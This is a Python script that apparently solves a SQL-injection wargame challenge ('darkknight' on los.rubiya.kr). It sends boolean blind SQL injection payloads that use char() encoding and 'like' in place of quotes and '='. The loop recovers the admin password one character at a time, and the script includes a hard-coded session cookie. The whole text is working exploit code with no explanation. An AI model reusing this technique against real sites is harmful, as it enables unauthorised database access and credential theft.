import urllib,requests


password=""


for j in range(1,9): 
    for i in range(48,128):
        try:
            url="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no=1%20or%20id%20like%20char(97,100,109,105,110)%20and%20mid(pw,"+str(j)+",1)%20like%20char("+str(i)+")"
            r = requests.post(url,cookies=(dict(PHPSESSID="t3lssqi3a9enhffi1mac5amc65")))
        except:
            print("Error")
            continue
        if 'Hello admin' in r.text: 
            password = password + chr(i)
            print ("[+] PW " + str(j) + " : " + password)
            break
